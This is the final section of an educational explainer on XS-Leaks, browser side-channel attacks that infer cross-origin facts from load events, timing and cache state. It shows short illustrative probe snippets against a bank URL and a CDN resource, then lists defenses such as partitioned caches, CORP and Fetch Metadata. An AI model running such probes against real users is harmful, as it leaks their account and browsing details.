XS-Leaks (Cross-Site Leaks) exploit the fact that SOP prevents reading cross-origin response **content** but doesn't prevent observing **side-channel information**: timing, status codes (via load/error events), frame count, redirect count, response size, and cache state.

**Mechanism:**

A script at `attacker.com` includes:
```html
<img src="https://bank.com/account-statement?period=2024-05" 
     onload="timeline.push({url: 'statement', time: Date.now(), loaded: true})"
     onerror="timeline.push({url: 'statement', time: Date.now(), loaded: false})">
```

The attacker can't READ the image contents. But they learn:
- Did the request succeed (200) or fail (4xx)? → Does this user have an account at this bank?
- How long did it take? → How large is the statement? → How many transactions?
- Did it redirect? → Is the user logged in?

**Cache timing attacks:**

```javascript
const start = performance.now();
await fetch('https://cdn.example.com/proprietary-logo.png', {mode: 'no-cors'});
const end = performance.now();

if (end - start < 5) {
    // Cache hit: this user recently visited a site that loaded this resource
    // Inference: user has visited example.com's premium service
}
```

**Defenses being deployed:**

1. **Partitioned caches** (Chrome 86+, Firefox, Safari): HTTP cache is partitioned by top-level site (eTLD+1 + scheme). `attacker.com` can't probe the cache state of resources loaded by `example.com`.

2. **Cross-Origin Resource Policy (CORP)**: A response header `Cross-Origin-Resource-Policy: same-site` instructs the browser to reject cross-origin loads of this resource entirely — even opaque (no-cors) loads. This blocks the `img` timing attack.

3. **Fetch Metadata (`Sec-Fetch-*` headers)**: Servers can reject suspicious cross-origin requests using these browser-injected headers.

4. **COOP + COEP**: Enables `crossOriginIsolated` mode, which restricts `SharedArrayBuffer` and high-resolution timing APIs (which would make timing attacks more precise).

5. **Private Network Access**: Prevents public sites from loading resources from private IP ranges (closes DNS rebinding and internal network XS-Leak vectors).

---

*End of document. This breakdown should be revisited when: browsers update their SameSite defaults (changes regularly), when the Fetch metadata spec is updated, when CSP Level 4 features are implemented (such as 'script-src-elem' and 'script-src-attr' granularity), or when new XS-Leak attack techniques are published.*

---

**Critical References:**
- Fetch Living Standard (fetch.spec.whatwg.org)
- Content Security Policy Level 3 (W3C Working Draft)
- HTML Living Standard — Cross-origin restrictions
- RFC 6454: The Web Origin Concept
- XS-Leaks Wiki (xsleaks.dev)
- MDN: Cross-Origin Resource Sharing (CORS)
- OWASP CORS Security Cheat Sheet